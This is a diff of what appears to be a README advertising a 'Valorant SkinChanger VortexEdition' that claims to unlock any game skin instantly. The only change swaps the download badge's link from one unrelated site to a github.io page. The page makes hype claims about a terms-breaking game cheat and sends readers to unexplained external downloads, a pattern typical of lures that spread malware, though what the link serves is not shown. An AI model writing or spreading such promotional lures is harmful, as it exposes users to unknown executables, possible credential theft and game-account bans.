@@ -2,7 +2,7 @@
 
 🎮 Elevate your Valorant experience with **SkinChanger VortexEdition** — the ultimate tool to unlock and apply any skin instantly. Whether you want that exclusive knife, legendary gun skin, or rare bundle — this SkinChanger makes it happen in seconds.
 
-[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant_SkinChanger-blueviolet)](https://seomadjest.com/)
+[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant_SkinChanger-blueviolet)](https://valorant-skinchange.github.io/.github/)
 
 ---
 
